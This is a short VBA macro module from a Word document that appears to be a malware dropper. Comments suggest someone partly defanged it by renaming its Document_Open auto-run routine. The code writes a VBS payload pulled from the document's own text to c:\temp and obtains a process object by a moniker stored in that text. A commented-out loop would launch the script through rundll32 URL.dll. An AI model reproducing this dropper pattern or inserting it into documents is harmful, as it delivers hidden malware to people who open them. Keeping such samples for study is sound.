VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
END
Attribute VB_Name = "EffectiveMagazine"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
' HTC - Tu Document_Open thanh Document_Open_ThangChaMay
Private Sub Document_Open_ThangChaMay()
    Set n = New FileSystemObject
    On Error Resume Next
    n.CreateFolder "c:\temp\word_templates" ' HTC sua vao C:\temp
    Set s = n.CreateTextFile("c:\temp\word_templates\yellow_color.vbs")
    s.WriteLine(Right(Range.Text, 65878)) = True
    str_1 = Left(Range.Text, 22)
    Debug.Print str_1
    Set pid = GetObject(str_1)
    'While pid.create("rundll32 URL.dll,FileProtocolHandler c:\temp\word_templates\yellow_color.vbs", Null, Null, 0) = 1
    'Wend
End Sub
